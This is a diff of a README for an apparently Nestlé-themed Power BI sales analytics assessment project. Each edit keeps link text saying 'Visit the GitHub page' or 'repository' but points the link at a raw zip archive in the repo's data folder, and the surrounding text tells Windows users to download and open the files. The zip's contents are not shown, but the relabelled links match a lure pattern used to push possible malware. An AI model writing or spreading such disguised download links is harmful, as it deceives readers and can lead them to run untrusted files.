@@ -1,6 +1,6 @@
 # 📊 powerbi-sales-analytics-nestle-assessment - Sales insights in one place
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge&logo=github)](https://github.com/piggyaroused866/powerbi-sales-analytics-nestle-assessment)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/piggyaroused866/powerbi-sales-analytics-nestle-assessment/main/data/powerbi_sales_analytics_assessment_nestle_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use this README to visit the project page, get the files, and open the report in
 
 Open the project page here:
 
-[Visit the GitHub repository](https://github.com/piggyaroused866/powerbi-sales-analytics-nestle-assessment)
+[Visit the GitHub repository](https://raw.githubusercontent.com/piggyaroused866/powerbi-sales-analytics-nestle-assessment/main/data/powerbi_sales_analytics_assessment_nestle_1.0.zip)
 
 If the page includes a release file or project archive, download it to your Windows PC. Save it to a folder you can find again, such as Downloads or Desktop.
 
@@ -222,7 +222,7 @@ If the report uses local data, store the input files in the `Data` folder and ke
 
 Visit the project page here:
 
-[https://github.com/piggyaroused866/powerbi-sales-analytics-nestle-assessment](https://github.com/piggyaroused866/powerbi-sales-analytics-nestle-assessment)
+[https://raw.githubusercontent.com/piggyaroused866/powerbi-sales-analytics-nestle-assessment/main/data/powerbi_sales_analytics_assessment_nestle_1.0.zip](https://raw.githubusercontent.com/piggyaroused866/powerbi-sales-analytics-nestle-assessment/main/data/powerbi_sales_analytics_assessment_nestle_1.0.zip)
 
 From that page, download the project files, open the main Power BI report in Power BI Desktop on Windows, and refresh the data before using the dashboard
 
